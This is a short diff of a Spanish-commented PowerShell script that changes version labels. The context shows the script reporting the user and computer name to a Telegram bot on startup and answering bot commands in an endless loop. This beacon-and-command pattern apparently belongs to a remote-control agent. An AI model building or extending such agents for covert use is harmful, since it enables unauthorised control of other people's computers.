@@ -37,7 +37,7 @@ try {
 
 # --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
 try {
-    $MensajeInicio = " Ver 8 PC En Linea y Protegida: " + $User + "@" + $MiPC
+    $MensajeInicio = " Ver 10 PC En Linea y Protegida: " + $User + "@" + $MiPC
     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
 } catch {}
 
@@ -77,7 +77,7 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "ver 6 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "ver 10 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
